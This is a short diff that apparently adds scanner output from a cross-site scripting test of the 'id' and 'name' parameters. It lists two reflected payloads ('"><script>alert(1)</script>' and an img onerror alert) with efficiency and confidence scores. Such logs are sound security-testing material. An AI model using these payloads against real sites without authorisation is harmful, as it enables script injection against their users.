@@ -1,0 +1,11 @@
+[INFO] Testing parameter: id
+[INFO] Reflections found: 1
+[INFO] Payloads generated: 3
+[+] Payload: "><script>alert(1)</script>
+[INFO] Efficiency: 92
+[INFO] Confidence: 4
+[INFO] Testing parameter: name
+[INFO] Reflections found: 1
+[+] Payload: <img src=x onerror=alert(1)>
+[INFO] Efficiency: 100
+[INFO] Confidence: 5
